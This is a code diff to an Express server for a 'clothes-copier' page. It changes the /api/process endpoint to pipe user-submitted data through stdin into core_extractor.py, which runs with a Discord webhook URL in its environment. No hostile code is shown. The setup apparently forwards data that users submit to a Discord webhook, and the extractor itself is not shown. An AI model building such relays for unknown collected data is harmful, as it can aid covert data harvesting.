@@ -1,5 +1,5 @@
 const express = require('express');
-const { execFile } = require('child_process');
+const { spawn } = require('child_process');
 const path = require('path');
 const fs = require('fs');
 
@@ -8,10 +8,8 @@ const app = express();
 app.use(express.json({ limit: '10mb' }));
 app.use(express.urlencoded({ limit: '10mb', extended: true }));
 
-// Serve static files from public folder
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Route specifically for /clothes-copier
 app.get('/clothes-copier', (req, res) => {
     const targetFile = 'clothes-copier.html';
     const filePath = path.join(__dirname, 'public', targetFile);
@@ -22,7 +20,6 @@ app.get('/clothes-copier', (req, res) => {
     }
 });
 
-// Redirect root to /clothes-copier
 app.get('/', (req, res) => {
     res.redirect('/clothes-copier');
 });
@@ -38,14 +35,31 @@ app.post('/api/process', (req, res) => {
         return res.status(500).json({ success: false, error: "Webhook not configured on server" });
     }
 
-    execFile('python3', ['core_extractor.py', data], {
+    const pyProcess = spawn('python3', ['core_extractor.py'], {
         env: { ...process.env, DISCORD_WEBHOOK_URL: webhookUrl }
-    }, (error, stdout, stderr) => {
-        if (error) {
-            return res.status(500).json({ success: false, error: "Extractor execution failed.", details: stderr || error.message });
-        }
-        res.json({ success: true, output: stdout });
     });
+
+    let stdoutData = '';
+    let stderrData = '';
+
+    pyProcess.stdout.on('data', (chunk) => {
+        stdoutData += chunk;
+    });
+
+    pyProcess.stderr.on('data', (chunk) => {
+        stderrData += chunk;
+    });
+
+    pyProcess.on('close', (code) => {
+        if (code !== 0) {
+            return res.status(500).json({ success: false, error: "Extractor execution failed.", details: stderrData || `Exit code ${code}` });
+        }
+        res.json({ success: true, output: stdoutData });
+    });
+
+    // Send the payload safely through stdin
+    pyProcess.stdin.write(data);
+    pyProcess.stdin.end();
 });
 
 const PORT = process.env.PORT || 3000;
